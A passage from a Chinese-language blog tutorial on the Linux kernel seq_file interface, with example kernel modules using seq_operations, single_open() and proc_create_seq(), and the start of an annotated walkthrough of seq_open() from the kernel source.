class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(f, &amp;a3kmod_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    <span class="hljs-comment">//.proc_read_iter = seq_read_iter, /* it&#x27;s also okay! */</span><br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>简单测试一下，可以看到内核非常完美地按照我们的需求输出了序列文件数据：</p><p><img src="https://s2.loli.net/2024/06/02/xL3wgmPoT9IUCN7.png"></p><h2 id="序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）"><a href="#序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）" class="headerlink" title="序列文件接口开发：single file（仅单个序列对象读取的简易预实现）"></a>序列文件接口开发：single file（仅单个序列对象读取的简易预实现）</h2><p> <code>/fs/seq_file.c</code> 中除了序列文件接口以外，还有一套已经写好的 <code>single_*</code> 开头的序列文件接口实现，开发者只需要补充实现 <code>show()</code> 函数即可，这通常用于一些并不需要太复杂实现的 <strong>只需要读取一次的</strong> 场景（例如读取 <code>/proc/self/stat</code> ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">single_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-keyword">return</span> *pos ? <span class="hljs-literal">NULL</span> : SEQ_START_TOKEN;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">single_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>++*pos;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">single_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">single_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">int</span> (*show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *),</span><br><span class="hljs-params"><span class="hljs-type">void</span> *data)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);<br><span class="hljs-type">int</span> res = -ENOMEM;<br><br><span class="hljs-keyword">if</span> (op) &#123;<br>op-&gt;start = single_start;<br>op-&gt;next = single_next;<br>op-&gt;stop = single_stop;<br>op-&gt;show = show;<br>res = seq_open(file, op);<br><span class="hljs-keyword">if</span> (!res)<br>((<span class="hljs-keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;<br><span class="hljs-keyword">else</span><br>kfree(op);<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>EXPORT_SYMBOL(single_open);<br></code></pre></td></tr></table></figure><p>使用 single file 实现我们只需要将前面的 <code>seq_open()</code> 替换为 <code>single_open()</code> 并定义一个 <code>show()</code> 即可，注意传给 <code>show()</code> 的序列对象永远都是 NULL ，以下是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> age;<br>    <span class="hljs-type">size_t</span> money;<br>&#125; a3_info = &#123;<br>    .name   = <span class="hljs-string">&quot;arttnba3&quot;</span>,<br>    .age    = <span class="hljs-number">23</span>,<br>    .money  = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] name: %s\n&quot;</span>, a3_info.name);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] age: %ld\n&quot;</span>, a3_info.age);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] money: %ld\n&quot;</span>, a3_info.money);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> single_open(f, a3kmod_seq_show, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>测试一下：</p><p><img src="https://s2.loli.net/2024/06/03/BMN2iSZJVb3kwht.png"></p><h2 id="序列文件接口开发：proc-seq-接口"><a href="#序列文件接口开发：proc-seq-接口" class="headerlink" title="序列文件接口开发：proc_seq 接口"></a>序列文件接口开发：proc_seq 接口</h2><p>proc_seq 接口同时提供了创建 procfs 节点与初始化 seq_file 的功能，我们只需要调用 <code>proc_create_seq()</code> 便能创建 procfs + 初始化 seq_file 一步到位，底层而言不同的是其帮我们实现的是 <code>read_iter</code> 接口而非 <code>read()</code> 接口，这意味着 <em>这样的序列文件可以从内核侧被读取</em></p><p>下面是对上面的链表读取的例子进行简单重写的例子：</p><blockquote><p>其实也没有简化太多…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!proc_create_seq(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_seq_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>简单测试：</p><p><img src="https://s2.loli.net/2024/06/03/liUg9bKBcz1QqGV.png"></p><h1 id="0x02-序列文件接口-实现原理"><a href="#0x02-序列文件接口-实现原理" class="headerlink" title="0x02. 序列文件接口 - 实现原理"></a>0x02. 序列文件接口 - 实现原理</h1><p>序列文件接口的实现其实可以理解成在 VFS 上套了一层通用 wrapper，整体上还是比较简单的，本节我们从 VFS 文件接口的调用路径来看序列文件接口是如何实现的</p><h2 id="seq-open-：-序列文件初始化"><a href="#seq-open-：-序列文件初始化" class="headerlink" title="seq_open() ： 序列文件初始化"></a>seq_open() ： 序列文件初始化</h2><p>使用序列文件接口需要在自定义的 <code>read()</code> 函数中调用 <code>seq_open()</code> 进行初始化，这个函数的作用其实就是分配一个 <code>seq_file</code> 结构体存放到 <code>file::private</code> 中，并去除文件属性 <code>file::f_mode</code> 中的 <code>FMODE_PWRITE</code> 位（即文件变得不可被使用 <code>pwrite()</code> 访问，因为这个函数不会改变文件偏移，对序列文件接口而言增加了操作复杂性）</p><p>不过比起简约的函数本身，注释则详细地对序列文件接口进行了说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_open -初始化序列文件</span><br><span class="hljs-comment"> *@file: 我们要初始化的文件</span><br><span class="hljs-comment"> *@op: 描述序列的方法表</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *seq_open() 设置了 @file, 将其与一个由 @op 描述的序列进行关联。</span><br><span class="hljs-comment"> *@op-&gt;start() 启动了迭代器并返回序列的第一个元素。</span><br><span class="hljs-comment"> *@op-&gt;stop() 将其停止。  </span><br><span class="hljs-comment"> *@op-&gt;next() 返回序列的下一个元素。</span><br><span class="hljs-comment"> *@op-&gt;show() 将元素打印到缓冲区中。</span><br><span class="hljs-comment"> *在出错的情况下 -&gt;start() 与 -&gt;next() 返回 ERR_PTR(error)，</span><br><span class="hljs-comment"> *  在序列到达末尾时返回 NULL。</span><br><span class="hljs-comment"> *-&gt;show() 在成功时返回 0,在出错时返回一个负数值，</span><br><span class="hljs-comment"> *  返回 SEQ_SKIP 表示 &quot;丢弃这个元素并继续移动&quot;。</span><br><span class="hljs-comment"> *注意: seq_open() 会分配一个 struct seq_file 并将其指针</span><br><span class="hljs-comment"> *存放在 @file-&gt;private_data，这个指针不应当被修改。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *op)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">p</span>;</span><br><br>WARN_ON(file-&gt;private_data);<br><br>p = kmem_cache_zalloc(seq_file_cache, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!p)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>file-&gt;private_data = p;<br><br>mutex_init(&amp;p-&gt;lock);<br>p-&gt;op = op;<br><br><span class="hljs-comment">// 没有引用计数: &#x27;p&#x27; 的生命周期被约束到文件的生命周期</span><br>p-&gt;file = file;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_files 支持 lseek() 与 pread()，且一点也不支持 write()，</span><br><span class="hljs-comment"> * 但我们因为一些历史原因在这清除 